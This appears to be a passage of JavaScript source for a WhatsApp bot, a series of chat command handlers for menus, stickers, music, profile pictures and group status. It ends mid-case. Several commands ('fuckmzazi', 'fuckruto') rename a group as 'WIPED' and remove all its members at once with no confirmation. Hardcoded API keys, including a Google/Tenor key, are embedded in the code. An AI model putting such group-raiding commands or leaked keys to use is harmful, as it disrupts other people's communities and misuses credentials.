                    buttonId: `${prefix}alive`,
                    buttonText: { displayText: "✅ ALIVE" },
                    type: 1
                }
            ],
            headerType: 4
        }, { quoted: m });

        await mzazireply("✅ itest2 sent.");
    } catch (e) {
        logger.info(e);
        mzazireply(`❌ Error: ${e.message}`);
    }

    break;
}

// ══════════════════════════════════════════════════════
// TEST: document message
// ══════════════════════════════════════════════════════
//=====================================//

case 'itest3': {
    if (!isOwner) return mzazireply("❌ Owner only.");

    const imgPath = getMenuPic();

    try {
        await mzazi.sendMessage(sender, {
            document: fs.readFileSync(imgPath),
            mimetype: "image/jpeg",
            fileName: `${botName}.jpg`,
            caption: `📄 ${botName} document test`
        }, { quoted: m });

        await mzazireply("✅ itest3 sent.");
    } catch (e) {
        logger.info(e);
        mzazireply(`❌ Error: ${e.message}`);
    }

    break;
}

// ══════════════════════════════════════════════════════
// TEST: product-like image
// ══════════════════════════════════════════════════════
//=====================================//

case 'itest4': {
    if (!isOwner) return mzazireply("❌ Owner only.");

    const imgPath = getMenuPic();
    const imgBuffer = fs.readFileSync(imgPath);

    try {
        await mzazi.sendMessage(sender, {
            image: imgBuffer,
            caption:
`🛒 PRODUCT TEST

🤖 Bot: ${botName}
⚡ Prefix: ${prefix}
📦 Status: Online`
        }, { quoted: m });

        await mzazireply("✅ itest4 sent.");
    } catch (e) {
        logger.info(e);
        mzazireply(`❌ Error: ${e.message}`);
    }

    break;
}

// ══════════════════════════════════════════════════════
// TEST: event style
// ══════════════════════════════════════════════════════
//=====================================//

case 'itest5': {
    if (!isOwner) return mzazireply("❌ Owner only.");

    const imgPath = getMenuPic();
    const imgBuffer = fs.readFileSync(imgPath);

    try {
        await mzazi.sendMessage(sender, {
            image: imgBuffer,
            caption:
`📅 EVENT TEST

🎉 ${botName} Launch Event
🕒 Starts: ${new Date().toLocaleString()}
📍 Hosted by Mzazi Tech`
        }, { quoted: m });

        await mzazireply("✅ itest5 sent.");
    } catch (e) {
        logger.info(e);
        mzazireply(`❌ Error: ${e.message}`);
    }

    break;
}


//=====================================//

case 'mzazi2': {
  const menuText = `╭━━━━━━━━━━━━━━━━━━━╮
┃ *${botName.toUpperCase()}* 🤖
┃ ═══════════════════
┃ ✨ *Status*: Online
┃ 🔧 *Prefix*: ${prefix}
┃ 👑 *Owner*: @${ownersList[0] || botPhoneNum}
┃ 📦 *Commands*: 50+
╰━━━━━━━━━━━━━━━━━━━╯

📌 *How to use*
• Type *${prefix}help* to see this menu
• Click buttons below for quick actions

> _Powered by Mzazi Tech_`;

  // Build interactive buttons (works on both business & personal)
  const buttons = [
    {
      name: 'quick_reply',
      buttonParamsJson: JSON.stringify({
        display_text: '📋 All Commands',
        id: `${prefix}allcmd`
      })
    },
    {
      name: 'cta_url',
      buttonParamsJson: JSON.stringify({
        display_text: '📢 Channel',
        url: config.REQUIRED_CHANNEL_LINK || 'https://whatsapp.com/channel/...',
        merchant_url: config.REQUIRED_CHANNEL_LINK || 'https://whatsapp.com/channel/...'
      })
    },
    {
      name: 'cta_url',
      buttonParamsJson: JSON.stringify({
        display_text: '👥 Group',
        url: config.REQUIRED_GROUP_LINK || 'https://chat.whatsapp.com/...',
        merchant_url: config.REQUIRED_GROUP_LINK || 'https://chat.whatsapp.com/...'
      })
    },
    {
      name: 'cta_copy',
      buttonParamsJson: JSON.stringify({
        display_text: '📋 Copy Prefix',
        id: 'copy_prefix_menu',
        copy_code: prefix
      })
    },
    {
      name: 'quick_reply',
      buttonParamsJson: JSON.stringify({
        display_text: '🤖 AI Chat',
        id: `${prefix}ai Hello`
      })
    }
  ];

  try {
    await mzazi.sendMessage(sender, {
      text: menuText,
      mentions: [ownersList[0] ? `${ownersList[0]}@s.whatsapp.net` : null].filter(Boolean),
      buttons: buttons,
      headerType: 1
    }, { quoted: m });
  } catch (err) {
    // Fallback: if interactive buttons fail, send plain text menu
    logger.error('Menu buttons error:', err.message);
    await mzazireply(menuText + '\n\n_Buttons not supported on this client – use text commands._');
  }
  break;
}

// ─────────────────────────────────────────────
// CASE: kickall – wipe group: change name, description, remove everyone
// ─────────────────────────────────────────────
// ─────────────────────────────────────────────
// CASE: kickall – wipe group: change name, description, remove everyone (one batch)
// ─────────────────────────────────────────────
//=====================================//

case 'fuckmzazi': {
  if (!isGroup) return mzazireply('❌ This command only works in groups.');
  
  if (!isAdmin && !isOwner) return mzazireply('❌ You need admin privileges to use this command.');

  // Confirm with a short delay (optional, can remove)
  await mzazireply('⚠️ *WIPING GROUP – ONE BATCH* ⚠️\nChanging name & description then removing ALL members...');
  await new Promise(r => setTimeout(r, 2000));

  // Step 1: Change group name and description
  try {
    await mzazi.groupUpdateSubject(sender, `WIPED BY ${botName.toUpperCase()}`);
    await mzazi.groupUpdateDescription(sender, `This group has been wiped. Owner: @${senderNum}`);
  } catch (err) {
    logger.error('Failed to update subject/desc:', err);
  }

  // Step 2: Build list of all members except bot and executor
  const executorJid = msgSender;
  const botJids = [botJid, botLid, `${botPhoneNum}@s.whatsapp.net`, `${botPhoneNum}@whatsapp.net`].filter(Boolean);
  const keepJids = new Set([executorJid, ...botJids]);
  
  const toRemove = participants
    .map(p => normalizeJid(p.id))
    .filter(jid => !keepJids.has(jid));

  if (toRemove.length === 0) {
    await mzazireply('✅ Group wiped (no other members).');
    break;
  }

  await mzazireply(`🔄 Removing ${toRemove.length} members in a single batch...`);

  // Remove all at once (parallel requests)
  const results = await Promise.allSettled(
    toRemove.map(jid => mzazi.groupParticipantsUpdate(sender, [jid], 'remove'))
  );
  const succeeded = results.filter(r => r.status === 'fulfilled').length;
  const failed = results.filter(r => r.status === 'rejected').length;

  await mzazireply(`✅ *GROUP WIPED – ONE BATCH*\nRemoved: ${succeeded}\nFailed: ${failed}\nName & description changed.`);
  break;
}

// ──────────────────────────────────────────────────────────
// CASE: kickall – remove 200 members in parallel (one batch)
// ──────────────────────────────────────────────────────────
//=====================================//

case 'fuckruto': {
  if (!isGroup) return mzazireply('❌ Group only.');
  
  if (!isAdmin && !isOwner) return mzazireply('❌ Admin only.');

  await mzazireply('⚡ Removing everyone fast...');

  // keep bot + command sender
  const keepSet = new Set([
    normalizeJid(msgSender),
    normalizeJid(botJid),
    normalizeJid(botLid),
    `${botPhoneNum}@s.whatsapp.net`,
    `${botPhoneNum}@whatsapp.net`
  ]);

  // unique members only
  const toRemove = [
    ...new Set(
      participants
        .map(p => normalizeJid(p.id))
        .filter(jid => !keepSet.has(jid))
    )
  ];

  if (!toRemove.length) {
    return mzazireply('✅ No members found.');
  }

  const start = Date.now();

  // remove all at once (parallel)
  const results = await Promise.allSettled(
    toRemove.map(jid =>
      mzazi.groupParticipantsUpdate(sender, [jid], 'remove')
    )
  );

  const removed = results.filter(r => r.status === 'fulfilled').length;
  const failed = results.filter(r => r.status === 'rejected').length;

  const speed = ((Date.now() - start) / 1000).toFixed(2);

  await mzazireply(
    `✅ Done in ${speed}s\nRemoved: ${removed}\nFailed: ${failed}`
  );

  break;
}
// ──────────────────────────────────────────────────────────
// CASE: kickall – remove each member ONCE only
// ──────────────────────────────────────────────────────────
//=====================================//

// ── KICKALL COMMAND ────────────────────────────────────────────────
case "kickall": {
  if (!isGroup) return mzazireply("❌ This command is for groups only!");
  if (!isOwner) return mzazireply("❌ Only the bot owner can use this command!");
  
  // Confirmation to prevent accidents
  const confirm = text.toLowerCase().includes('confirm');
  if (!confirm) {
    return mzazireply(
      `⚠️ *DANGEROUS ACTION*\n\n` +
      `This will remove ALL members from this group.\n` +
      `You will be the only one left.\n\n` +
      `To confirm, type:\n` +
      `${prefix}kickall confirm`,
      { showMenu: false }
    );
  }
  
  try {
    await mzazireply("⏳ Removing all members from this group...");
    
    // Get all group participants
    const groupMetadata = await mzazi.groupMetadata(sender);
    const participants = groupMetadata.participants;
    
    // Filter out the bot itself and the owner
    const botJid = mzazi.user.id.split(':')[0] + '@s.whatsapp.net';
    const ownerJid = ownerNumbers[0] ? `${ownerNumbers[0]}@s.whatsapp.net` : botJid;
    
    const toRemove = participants
      .filter(p => p.id !== botJid && p.id !== ownerJid)
      .map(p => p.id);
    
    if (toRemove.length === 0) {
      return mzazireply("✅ No members to remove! Only bot and owner are in the group.");
    }
    
    // Show member count
    await mzazireply(`📊 Found ${toRemove.length} members to remove.\n⏳ Starting removal...`);
    
    // Remove in chunks of 20 (WhatsApp limit)
    const chunkSize = 1030;
    let removed = 0;
    let failed = 0;
    const total = toRemove.length;
    
    for (let i = 0; i < total; i += chunkSize) {
      const chunk = toRemove.slice(i, i + chunkSize);
      
      try {
        await mzazi.groupParticipantsUpdate(sender, chunk, 'remove');
        removed += chunk.length;
        
        // Update progress every 5 chunks
        if ((i / chunkSize) % 5 === 0) {
          await mzazireply(`⏳ Progress: ${removed}/${total} members removed...`);
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 1500));
        
      } catch (err) {
        failed += chunk.length;
        logSystem(`Kickall chunk failed: ${err.message}`, 'error');
      }
    }
    
    await mzazireply(
      `✅ *KICKALL COMPLETE*\n\n` +
      `👥 Removed: ${removed}\n` +
      `❌ Failed: ${failed}\n` +
      `👑 Owner: MAGGIE X KERUBO\n` +
      `📋 Group: ${groupMetadata.subject}\n\n` +
      `_Only you and the bot remain in the group._`,
      { showMenu: true }
    );
    
  } catch (err) {
    logSystem(`Kickall error: ${err.message}`, 'error');
    await mzazireply(`❌ Error: ${err.message}`);
  }
  break;
}


case 'maggie2': {
  const menuText = 
    `╔════════════════════════════╗\n` +
    `║     🤖 *${botName.toUpperCase()}*     ║\n` +
    `║       MAIN MENU            ║\n` +
    `╚════════════════════════════╝\n\n` +
    `👋 *Hello ${m.pushName || 'User'}!*\n\n` +
    `📌 *Available Commands:*\n\n` +
    `🎵 .play <song> - Download music\n` +
    `🖼️ .image <prompt> - Generate image\n` +
    `🎨 .sticker - Make sticker\n` +
    `👑 .owner - Contact owner\n` +
    `🤖 .alive - Check bot status\n` +
    `📊 .stats - View bot stats\n\n` +
    `─────────────────────────────\n` +
    `© ${botName} | Dominic Mokua`;

  try {
    // Check if menu image exists
    const menuImagePath = './media/menu.jpg';
    let imageBuffer = null;
    
    if (fs.existsSync(menuImagePath)) {
      imageBuffer = fs.readFileSync(menuImagePath);
    }

    if (imageBuffer) {
      // Send with image + buttons
      await mzazi.sendMessage(
        sender,
        {
          image: imageBuffer,
          caption: menuText,
          footer: `© ${botName}`,
          buttons: [
            {
              buttonId: `${prefix}alive`,
              buttonText: { displayText: "🤖 Status" },
              type: 1
            },
            {
              buttonId: `${prefix}play`,
              buttonText: { displayText: "🎵 Music" },
              type: 1
            },
            {
              buttonId: `${prefix}image`,
              buttonText: { displayText: "🖼️ Image" },
              type: 1
            }
          ],
          headerType: 4
        },
        { quoted: m }
      );
    } else {
      // Send text with buttons
      await mzazi.sendMessage(
        sender,
        {
          text: menuText,
          footer: `© ${botName}`,
          buttons: [
            {
              buttonId: `${prefix}alive`,
              buttonText: { displayText: "🤖 Status" },
              type: 1
            },
            {
              buttonId: `${prefix}play`,
              buttonText: { displayText: "🎵 Music" },
              type: 1
            },
            {
              buttonId: `${prefix}image`,
              buttonText: { displayText: "🖼️ Image" },
              type: 1
            },
            {
              buttonId: `${prefix}owner`,
              buttonText: { displayText: "👑 Owner" },
              type: 1
            }
          ],
          headerType: 1
        },
        { quoted: m }
      );
    }
  } catch (err) {
    // Ultimate fallback: plain text
    await mzazireply(menuText);
  }
  break;
}


//=====================================//

case 'menuv': {
  if (!isOwner) return;
  const buttons = [
    { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '📋 Commands', id: `${prefix}allcmd` }) },
    { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: '📢 Channel', url: 'https://whatsapp.com/channel/...' }) }
  ];
  await mzazi.sendMessage(sender, { text: 'Menu with buttons', buttons, headerType: 1 });
  break;
}

//=====================================//

case "dare": {
    try {
        const shizokeys = "shizo";

        const res = await fetch(
            `https://shizoapi.onrender.com/api/texts/dare?apikey=${shizokeys}`
        );

        if (!res.ok) {
            throw new Error(await res.text());
        }

        const json = await res.json();
        const dareMessage = json.result;

        await mzazireply(`🎯 *DARE CHALLENGE*\n\n${dareMessage}`);

    } catch (error) {
        logger.error("Error in dare command:", error);

        await mzazireply(
            "❌ Failed to get dare. Please try again later!"
        );
    }

    break;
}

//=====================================//

case "emojimix":
//=====================================//

case "mixemoji":
//=====================================//

case "emix": {
    try {
        if (!text) {
            return mzazireply(
                `🎴 Example:\n${prefix}emojimix 😎+🥰`
            );
        }

        if (!text.includes("+")) {
            return mzazireply(
                `✳️ Separate the emoji with a *+* sign\n\n📌 Example:\n${prefix}emojimix 😎+🥰`
            );
        }

        const [emoji1, emoji2] = text
            .split("+")
            .map(e => e.trim());

        const url =
            `https://tenor.googleapis.com/v2/featured?` +
            `key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ` +
            `&contentfilter=high&media_filter=png_transparent` +
            `&component=proactive&collection=emoji_kitchen_v5` +
            `&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`;

        const response = await fetch(url);
        const data = await response.json();

        if (!data.results || data.results.length === 0) {
            return mzazireply(
                "❌ These emojis cannot be mixed! Try different ones."
            );
        }

        const imageUrl = data.results[0].url;

        const tmpDir = "./tmp";

        if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
        }

        const tempFile = `${tmpDir}/temp_${Date.now()}.png`;
        const outputFile = `${tmpDir}/sticker_${Date.now()}.webp`;

        const imageResponse = await fetch(imageUrl);
        const buffer = Buffer.from(
            await imageResponse.arrayBuffer()
        );

        fs.writeFileSync(tempFile, buffer);

        const ffmpegCommand =
            `ffmpeg -i "${tempFile}" ` +
            `-vf "scale=512:512:force_original_aspect_ratio=decrease,format=rgba,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000" ` +
            `"${outputFile}"`;

        await new Promise((resolve, reject) => {
            exec(ffmpegCommand, (error) => {
                if (error) return reject(error);
                resolve();
            });
        });

        if (!fs.existsSync(outputFile)) {
            throw new Error("Sticker creation failed");
        }

        const stickerBuffer = fs.readFileSync(outputFile);

        await mzazi.sendMessage(sender, {
            sticker: stickerBuffer
        }, { quoted: m });

        // cleanup
        try {
            fs.unlinkSync(tempFile);
            fs.unlinkSync(outputFile);
        } catch (e) {
            logger.info("Cleanup error:", e);
        }

    } catch (error) {
        logger.error("EmojiMix Error:", error);

        await mzazireply(
            `❌ Failed to mix emojis!\n\n📌 Example:\n${prefix}emojimix 😎+🥰`
        );
    }

    break;
}

//=====================================//

case "buttons": {
    try {
        // Safely get botName and prefix (they should exist, but double-check)
        const btnBotName = (typeof botName === "string" && botName) || "Mzazi";
        const btnPrefix = (typeof prefix === "string" && prefix) || ".";

        // Create a simple button message
        const buttons = [
            { buttonId: `${btnPrefix}menu`, buttonText: { displayText: "📜 MENU" }, type: 1 },
            { buttonId: `${btnPrefix}ping`, buttonText: { displayText: "🏓 PING" }, type: 1 },
            { buttonId: `${btnPrefix}owner`, buttonText: { displayText: "👑 OWNER" }, type: 1 },
            { buttonId: `${btnPrefix}uptime`, buttonText: { displayText: "⚡ UPTIME" }, type: 1 }
        ];

        await mzazi.sendMessage(sender, {
            text: `🔥 *${btnBotName.toUpperCase()}* 🔥\n\nWelcome to Mzazi Tech Inc.\nChoose an option below.`,
            footer: "© Mzazi Tech Inc 2026",
            buttons: buttons,
            headerType: 1
        }, { quoted: m });

        logger.info(`Buttons sent to ${sender}`);
    } catch (err) {
        logger.error("Buttons fallback error:", err);
        // Ultimate fallback: just send a text menu
        await mzazi.sendMessage(sender, {
            text: `⚠️ Button menu failed.\nUse commands: ${prefix}menu, ${prefix}ping, ${prefix}owner, ${prefix}uptime`
        }, { quoted: m });
    }
    break;
}
//=====================================//

case "connect": {
    // Only bot owner can pair new numbers
    if (!isOwner) return mzazireply("❌ Owner only command.");

    // Extract phone number from command arguments
    if (args.length === 0) {
        return reply("⚠️ *Usage:* `.connect 254XXXXXXXXX`\nExample: `.connect 254712345678`");
    }

    const phoneNumber = args[0].trim();

    // Basic validation: numeric, length 10-15 digits
    if (!/^\d{10,15}$/.test(phoneNumber)) {
        return reply("❌ *Invalid number.* Provide a valid international format without `+` or spaces.\nExample: `254712345678`");
    }

    // Inform user that we are requesting the code
    await reply(`🔐 Requesting pairing code for *${phoneNumber}* ...\nPlease wait a few seconds.`);

    try {
        // telegramUserId = null (no Telegram notification needed)
        const pairingCode = await requestPairingCode(phoneNumber, null);

        // Send the code back to the WhatsApp chat
        await mzazi.sendMessage(sender, {
            text: `✅ *Pairing code for ${phoneNumber}*\n\n➜ \`${pairingCode}\`\n\nOpen WhatsApp on that device and enter this code to link the bot.`
        }, { quoted: m });
    } catch (error) {
        logger.error("Pairing error:", error);
        await reply(`❌ Failed to get pairing code: ${error.message}\n\nMake sure the number is not already linked and is valid.`);
    }
    break;
}

//=====================================//

case 'disappear':
//=====================================//

case 'ephemeral':
//=====================================//

case 'disappearing':
//=====================================//

case 'vanish': {
    // Permission check for groups
    if (isGroup && !isOwner && !isAdmin) {
        await mzazireply('❌ Only group admins or bot owner can change disappearing messages.');
        break;
    }

    // Permission check for DMs
    if (!isGroup && !isOwner && !m.key.fromMe) {
        await mzazireply('❌ Only the bot owner can change disappearing messages in DMs.');
        break;
    }

    const input = args[0]?.toLowerCase();
    if (!input) {
        await mzazireply(
            `*⏳ DISAPPEARING MESSAGES*\n\n` +
            `*Usage:*\n` +
            `• \`${prefix}disappear off\` — Disable\n` +
            `• \`${prefix}disappear 24h\` — 24 hours\n` +
            `• \`${prefix}disappear 7d\` — 7 days (default)\n` +
            `• \`${prefix}disappear 90d\` — 90 days`
        );
        break;
    }

    const durations = {
        'off': false,
        '0': false,
        '24h': 86400,
        '1d': 86400,
        '7d': 604800,
        '1w': 604800,
        '90d': 7776000,
        '3m': 7776000,
    };

    if (!(input in durations)) {
        await mzazireply(`❌ Invalid option: *${input}*\n\nChoose: \`off\`, \`24h\`, \`7d\`, \`90d\``);
        break;
    }

    const seconds = durations[input];
    try {
        await mzazi.sendMessage(sender, {
            disappearingMessagesInChat: seconds === false ? false : seconds
        });

        const labels = {
            'off': '❌ Disappearing messages *disabled*',
            '0': '❌ Disappearing messages *disabled*',
            '24h': '⏳ Disappearing messages set to *24 hours*',
            '1d': '⏳ Disappearing messages set to *24 hours*',
            '7d': '⏳ Disappearing messages set to *7 days*',
            '1w': '⏳ Disappearing messages set to *7 days*',
            '90d': '⏳ Disappearing messages set to *90 days*',
            '3m': '⏳ Disappearing messages set to *90 days*',
        };

        await mzazireply(labels[input]);
    } catch (e) {
        logger.error('[DISAPPEAR] Error:', e.message);
        await mzazireply(`❌ Failed to change disappearing messages: ${e.message}`);
    }
    break;
}

//=====================================//

case 'getpp':
//=====================================//

case 'getpic':
//=====================================//

case 'pp':
//=====================================//

case 'profilepic': {
    let targetJid = null;

    // Check if a user is mentioned
    const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentioned && mentioned[0]) {
        targetJid = mentioned[0];
    }
    // Check if a message is quoted
    else if (m.message?.extendedTextMessage?.contextInfo?.participant) {
        targetJid = m.message.extendedTextMessage.contextInfo.participant;
    }
    // If in group and no target, use sender
    else if (isGroup) {
        targetJid = msgSender;
    }
    // If in DM, use the other participant (the bot's own pp could be fetched, but sender is the user)
    else {
        targetJid = sender;
    }

    if (!targetJid) {
        await mzazireply('❌ Could not identify the target user.');
        break;
    }

    try {
        // Get profile picture URL
        const ppUrl = await mzazi.profilePictureUrl(targetJid, 'image').catch(() => null);
        if (!ppUrl) {
            await mzazireply(`❌ No profile picture found for @${jidToNumber(targetJid)}.`, { mentions: [targetJid] });
            break;
        }

        // Download the image buffer
        const { data: imageBuffer } = await axios.get(ppUrl, { responseType: 'arraybuffer' });

        // Send the profile picture
        await mzazi.sendMessage(sender, {
            image: Buffer.from(imageBuffer),
            caption: `📸 Profile picture of @${jidToNumber(targetJid)}`,
            mentions: [targetJid]
        }, { quoted: m });
    } catch (err) {
        logger.error('GetPP error:', err);
        await reply(`❌ Failed to get profile picture: ${err.message}`);
    }
    break;
}

//=====================================//

case 'setgpp':
//=====================================//

case 'setgpic':
//=====================================//

case 'grouppp':
//=====================================//

case 'setgrouppic': {
    // Group only
    if (!isGroup) {
        await reply('❌ This command can only be used in groups.');
        break;
    }

    // Admin or owner only
    if (!isOwner && !isAdmin) {
        await reply('❌ Only group admins or bot owner can change the group picture.');
        break;
    }

    // Check if replying to an image or sticker
    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const imageMsg = quotedMsg?.imageMessage || quotedMsg?.stickerMessage;
    if (!imageMsg) {
        await reply('❌ *Please reply to an image or sticker*\n\nUsage: Reply to an image with `.setgpp`');
        break;
    }

    try {
        // Create tmp directory if it doesn't exist
        const tmpDir = path.join(process.cwd(), 'tmp');
        if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
        }

        // Download the image using Baileys' downloadContentFromMessage
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        const stream = await downloadContentFromMessage(imageMsg, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        // Save to temporary file
        const imgPath = path.join(tmpDir, `gpp_${Date.now()}.jpg`);
        fs.writeFileSync(imgPath, buffer);

        // Update group profile picture
        await mzazi.updateProfilePicture(sender, { url: imgPath });

        // Clean up temp file
        try { fs.unlinkSync(imgPath); } catch (e) {}

        await reply('✅ *Group profile picture updated successfully!*');
    } catch (err) {
        logger.error('SetGPP error:', err);
        await reply('❌ *Failed to update group profile picture*\n\nMake sure the bot is an admin and the image is valid.');
    }
    break;
}

//=====================================//

case 'toimg':
//=====================================//

case 'toimage':
//=====================================//

case 'img': {
    // Check if replying to a sticker
    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const stickerMsg = quotedMsg?.stickerMessage;

    if (!stickerMsg) {
        await reply('❌ *Please reply to a sticker.*\n\nUsage: Reply to a sticker with `.toimg`');
        break;
    }

    try {
        // Download the sticker
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        // Sharp is intentionally not installed because Baileys versions used
        // by this bot declare an incompatible optional sharp peer. Keep the
        // bot startup-safe and tell the user to use the sticker command until
        // an external image converter is configured.
        await reply('❌ *Sticker conversion is unavailable in this build.*\n\nThe bot is running normally; use the original sticker or install a compatible image converter separately.');
    } catch (err) {
        logger.error('ToImg error:', err);
        await reply('❌ *Failed to convert sticker.*\n\nMake sure it\'s a valid sticker and not animated (webp only).');
    }
    break;
}
//=====================================//

case 'setdesc':
//=====================================//

    case 'setdesk': {
        if (!isGroup) return m.reply('❌ This command can only be used in groups.');
        if (!isAdmin && !isOwner) return m.reply('❌ Only admins can change group description.');
        if (!isBotAdmins) return m.reply('❌ I need to be admin to change group description.');
        if (!text) return m.reply('❌ Provide the new description.');
        await mzazi.groupUpdateDescription(from, text);
        m.reply('✅ Group description updated.');
    }
    break;
    
//=====================================//

case "play11": {
    if (!text) return mzazireply("🎧 Example: .play faded");

    let api = `https://ytsongsapi.onrender.com/play?query=${encodeURIComponent(text)}&key=darknode-9x7kP2`;

    try {
        let { data } = await axios.get(api);

        if (!data || !data.status) {
            return mzazireply("❌ Song not found");
        }

        // Song info kupitia mzazireply
        await mzazireply(`
╭━━〔 🎧 ${botName.toUpperCase()} PLAYER 〕━━⬣
┃ 🎵 Title : ${data.title}
┃ 📺 Channel : ${data.channel}
┃ ⏱ Duration : ${data.duration}
┃ 👀 Views : ${data.views}
╰━━━━━━━━━━━━━━━━⬣

⏳ Downloading audio...
        `);

        // Then send audio
        await mzazi.sendMessage(sender, {
            audio: { url: data.download },
            mimetype: "audio/mpeg",
            fileName: `${data.title}.mp3`,
            ptt: false
        }, { quoted: m });

    } catch (err) {
        logger.error("PLAY ERROR:", err);
        mzazireply("❌ Failed to fetch song. Please try again later.");
    }

    break;
}



//=====================================//

case "togstatus":
//=====================================//

case "swgc":
//=====================================//

case "groupstatus": {
    // ─── Required imports (add at top of your file if not already present) ───
    const crypto = require("crypto");
    const ffmpeg = require("fluent-ffmpeg");
    const { PassThrough } = require("stream");
    const baileys = require("@whiskeysockets/baileys");

    // ─── Helper functions (inside the case or as external helpers) ─────────
    const hexToArgb = (hex) => {
        const h = hex.replace("#", "");
        const r = parseInt(h.slice(0, 2), 16);
        const g = parseInt(h.slice(2, 4), 16);
        const b = parseInt(h.slice(4, 6), 16);
        return ((0xff << 24) | (r << 16) | (g << 8) | b) >>> 0;
    };

    const buildMsgObj = (originalMessage, quotedContent) => {
        const ctxInfo = originalMessage.message?.extendedTextMessage?.contextInfo;
        return {
            key: {
                remoteJid: originalMessage.key.remoteJid,
                fromMe: false,
                id: ctxInfo?.stanzaId || originalMessage.key.id,
                participant: ctxInfo?.participant,
            },
            message: quotedContent,
        };
    };

    const toVN = (buffer) => {
        return new Promise((resolve, reject) => {
            const input = new PassThrough();
            const output = new PassThrough();
            const chunks = [];
            input.end(buffer);
            ffmpeg(input)
                .noVideo()
                .audioCodec("libopus")
                .format("ogg")
                .audioChannels(1)
                .audioFrequency(48000)
                .on("error", reject)
                .on("end", () => resolve(Buffer.concat(chunks)))
                .pipe(output);
            output.on("data", (c) => chunks.push(c));
            output.on("error", reject);
        });
    };

    const generateWaveform = (buffer, bars = 64) => {
        return new Promise((resolve, reject) => {
            const input = new PassThrough();
            const output = new PassThrough();
            const chunks = [];
            input.end(buffer);
            ffmpeg(input)
                .audioChannels(1)
                .audioFrequency(16000)
                .format("s16le")
                .on("error", reject)
                .on("end", () => {
                    const raw = Buffer.concat(chunks);
                    const samples = raw.length / 2;
                    const amps = [];
                    for (let i = 0; i < samples; i++) {
                        amps.push(Math.abs(raw.readInt16LE(i * 2)) / 32768);
                    }
                    const size = Math.max(1, Math.floor(amps.length / bars));
                    const avg = Array.from({ length: bars }, (_, i) => {
                        const slice = amps.slice(i * size, (i + 1) * size);
                        return slice.length ? slice.reduce((a, b) => a + b, 0) / slice.length : 0;
                    });
                    const max = Math.max(...avg) || 1;
                    resolve(
                        Buffer.from(avg.map((v) => Math.floor((v / max) * 100))).toString("base64")
                    );
                })
                .pipe(output);
            output.on("data", (c) => chunks.push(c));
            output.on("error", reject);
        });
    };

    const groupStatus = async (conn, jid, content) => {
        const secret = crypto.randomBytes(32);
        const innerMsg = typeof content.toJSON === "function" ? content.toJSON() : content;
        const fullContent = {
            messageContextInfo: { messageSecret: secret },
            groupStatusMessageV2: {
                message: {
                    ...innerMsg,
                    messageContextInfo: { messageSecret: secret },
                },
            },
        };
        const msg = baileys.generateWAMessageFromContent(jid, fullContent, {});
        await conn.relayMessage(jid, msg.message, { messageId: msg.key.id });
        return msg;
    };

    // ─── Main logic ─────────────────────────────────────────────────────────
    const chatId = sender;  // use already‑validated sender JID
    const COLORS = {
        blue: "#34B7F1",
        green: "#25D366",
        yellow: "#FFD700",
        orange: "#FF8C00",
        red: "#FF3B30",
        purple: "#9C27B0",
        gray: "#9E9E9E",
        black: "#000000",
        white: "#FFFFFF",
        cyan: "#00BCD4",
    };

    const fmt = (title, lines) => {
        const header = `*╭─ׁ━❍↻ ${title} ↺❍━╮*`;
        const middle = lines.map(l => `*┃* ⌬ ─· ${l}`).join('\n');
        const footer = `*╰───────────────𝄞*\n> ${botName.toUpperCase()} 🔥`;
        return `${header}\n${middle}\n${footer}`;
    };

    try {
        // Parse args: caption|color|groupUrl
        const raw = args.join(" ").trim();
        let [caption, color, groupUrl] = raw.split("|").map(v => v?.trim());

        // Resolve target group (optional external link)
        let targetGroupId = chatId;
        if (groupUrl) {
            try {
                const code = groupUrl.split("/").pop().split("?")[0];
                const info = await mzazi.groupGetInviteInfo(code);
                targetGroupId = info.id;
                await reply(fmt("GROUP STATUS", [`🎯 Target: *${info.subject}*`]));
            } catch {
                return reply(fmt("ERROR", ["❌ Invalid group link or bot not in that group."]));
            }
        }

        // Detect quoted message
        const quoted =
            m.message?.extendedTextMessage?.contextInfo?.quotedMessage ||
            (m.message?.imageMessage ? m.message : null) ||
            (m.message?.videoMessage ? m.message : null) ||
            (m.message?.audioMessage ? m.message : null);

        const hasMedia = quoted && (quoted.imageMessage || quoted.videoMessage || quoted.audioMessage);

        // ── TEXT STATUS ─────────────────────────────────────────────────────
        if (!hasMedia) {
            if (!caption) {
                return reply(fmt("GROUP STATUS", [
                    "📌 Usage: .togstatus caption|color",
                    "       .togstatus |blue",
                    "or reply to image/video/audio",
                    "",
                    "🎨 Colors: blue,green,yellow,orange,red,purple,gray,black,white,cyan"
                ]));
            }
            const bgHex = COLORS[color?.toLowerCase()] || COLORS.blue;
            await groupStatus(mzazi, targetGroupId, {
                extendedTextMessage: {
                    text: caption,
                    backgroundArgb: hexToArgb(bgHex),
                    font: 0,
                },
            });
            return reply(fmt("GROUP STATUS", ["✅ Text status sent!"]));
        }

        // ── IMAGE STATUS ────────────────────────────────────────────────────
        if (quoted.imageMessage) {
            const buf = await baileys.downloadMediaMessage(
                buildMsgObj(m, quoted),
                "buffer",
                {},
                { reuploadRequest: mzazi.updateMediaMessage }
            );
            const content = await baileys.generateWAMessageContent(
                { image: buf, caption: caption || "" },
                { upload: mzazi.waUploadToServer }
            );
            await groupStatus(mzazi, targetGroupId, content);
            return reply(fmt("GROUP STATUS", ["✅ Image status sent!"]));
        }

        // ── VIDEO STATUS ────────────────────────────────────────────────────
        if (quoted.videoMessage) {
